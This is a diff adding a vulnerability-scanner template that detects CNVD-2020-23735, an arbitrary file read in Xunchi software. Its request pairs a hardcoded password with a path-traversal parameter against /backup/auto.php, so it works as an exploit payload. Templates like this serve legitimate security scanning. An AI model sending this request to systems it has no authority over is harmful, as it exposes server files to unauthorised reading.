@@ -1,0 +1,28 @@
+id: poc-yaml-xunchi-cnvd-2020-23735-file-read
+
+info:
+  name: poc-yaml-xunchi-cnvd-2020-23735-file-read
+  author: 清风明月(www.secbook.info)
+  severity: high
+  tags: xray-converted,lfi,cnvd-2020-23735,ct-158560
+  reference:
+    - http://www.cnxunchi.com
+    - https://www.cnvd.org.cn/flaw/show/2025171
+
+http:
+  - raw:
+      - |
+        GET /backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: deflate
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "NzbwpQSdbY06Dngnoteo2wdgiekm7j4N"
+          - "display_errors"
